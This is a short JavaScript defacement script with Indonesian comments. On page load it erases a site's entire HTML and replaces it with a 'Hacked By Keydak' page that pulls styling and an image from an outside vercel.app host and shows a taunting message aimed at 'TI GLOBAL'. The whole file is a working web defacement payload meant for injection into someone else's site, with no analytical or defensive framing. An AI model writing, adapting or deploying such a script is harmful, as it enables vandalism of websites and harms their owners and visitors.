// Deface script
document.addEventListener('DOMContentLoaded', function () {
    // Hapus seluruh konten HTML
    document.documentElement.innerHTML = '';

    // Buat elemen HTML baru sesuai dengan deface yang diinginkan
    var newHtmlContent = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Home - Hacked By Keydak</title>
            <link rel="stylesheet" href="https://kepo-six.vercel.app/style.css">
        </head>
        <body>
            <div class="mainContainer">
                <div class="img">
                    <img class="mainImage" src="https://kepo-six.vercel.app/jett.png" alt="image" style="width: 400px;">
                </div>
                <h1> Hacked By Keydak</h1>
                <hr class="hr">
                <div class="container">
                    <p class="text1">Kapan TI GLOBAL ngadain valorant????????????????????</p>
                </div>
            </div>
            <script src="deface.js"></script> <!-- tambahkan skrip deface.js jika diperlukan -->
        </body>
        </html>
    `;

    // Tambahkan konten HTML baru ke dalam dokumen
    document.documentElement.innerHTML = newHtmlContent;
});